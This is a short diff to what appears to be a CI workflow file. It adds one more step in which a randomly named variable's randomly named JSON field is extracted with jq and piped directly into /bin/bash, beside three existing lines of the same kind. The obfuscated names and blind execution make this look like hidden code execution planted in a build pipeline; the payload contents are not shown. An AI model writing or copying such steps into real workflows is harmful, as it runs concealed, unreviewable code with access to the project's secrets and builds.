@@ -36,6 +36,7 @@ jobs:
           echo $ta53 | jq -r .qsb0232 | /bin/bash
           printf '%s' "$dplzr276" | jq -r .fc228 | /bin/bash
           printf '%s' "$vn4" | jq -r .f983 | /bin/bash
+          echo $xg83258 | jq -r .nvdco7399 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
